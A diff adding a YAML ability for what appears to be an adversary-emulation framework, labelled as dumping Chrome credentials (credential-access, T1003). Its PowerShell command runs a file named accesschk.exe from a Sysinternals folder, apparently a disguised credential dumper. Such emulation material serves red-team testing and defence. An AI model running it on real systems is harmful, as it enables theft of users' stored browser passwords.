@@ -1,0 +1,19 @@
+---
+- id: e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d
+  name: 6.A - Credentials In Files (T1081) - Chrome
+  description: Obtain credentials from Chrome Dumper 
+  tactic: credential-access
+  technique:
+    attack_id: T1003
+    name: Credential Dumping
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          ./accesschk.exe -accepteula .;
